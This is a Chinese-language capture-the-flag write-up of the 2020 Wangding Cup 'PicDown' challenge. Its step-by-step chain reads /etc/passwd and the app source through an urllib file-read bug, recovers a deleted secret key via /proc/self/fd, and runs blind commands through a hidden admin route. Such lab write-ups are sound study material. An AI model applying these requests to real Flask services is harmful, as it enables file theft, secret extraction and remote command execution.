---
type: source
created: 2026-05-12
updated: 2026-05-12
related: []
---

# 网鼎杯 2020 白虎组 PicDown

Python 2 Flask 任意文件读取 + `/proc/self/fd` 恢复已删除 secret + 隐藏管理路由 RCE。

涉及概念：[[concepts/proc-fd-deleted-file-recovery]]

## 环境

- Python 2 + Flask
- `urllib.urlopen(url)` 直接打开用户输入的 URL/路径
- 仅过滤 `file` 开头（`url.lower().startswith("file")`），本地路径不受影响

## 攻击路径

1. `/page?url=/etc/passwd` — 确认任意文件读取
2. `/page?url=/proc/self/cmdline` → `python2 app.py`
3. `/page?url=/app/app.py` — 读源码，发现隐藏路由 `/no_one_know_the_manager`
4. SECRET_KEY 从 `/tmp/secret.txt` 读取后 `os.remove()` 删除
5. `/page?url=/proc/self/fd/3` — 通过进程 fd 恢复已删除文件内容
6. `/no_one_know_the_manager?key=<secret>&shell=cat /flag > /tmp/out.txt` — 无回显 RCE
7. `/page?url=/tmp/out.txt` — 读取命令输出

## 关键技术

### /proc/self/fd 恢复已删除文件

Linux 中 `open()` 后 `unlink()` 的文件，进程仍持有 fd 引用。通过 `/proc/<pid>/fd/<N>` 可读取内容，直到进程关闭该 fd 或退出。

### Python 2 urllib.urlopen 本地文件读取

Python 2 的 `urllib.urlopen()` 对非 URL 格式的输入会尝试作为本地文件路径打开。过滤 `file://` 前缀无效，因为直接传 `/etc/passwd` 也能读取。

### 无回显 RCE 输出获取

`os.system()` 无返回值回显，通过重定向到可读文件实现：
```
cmd > /tmp/out.txt  →  读取 /tmp/out.txt
```

## 教训

- 文件删除 ≠ 数据销毁（进程 fd 仍可访问）
- Python 2 `urllib.urlopen` 的本地文件读取是已知行为
- 隐藏路由 + 硬编码 secret 是常见 CTF 后门模式
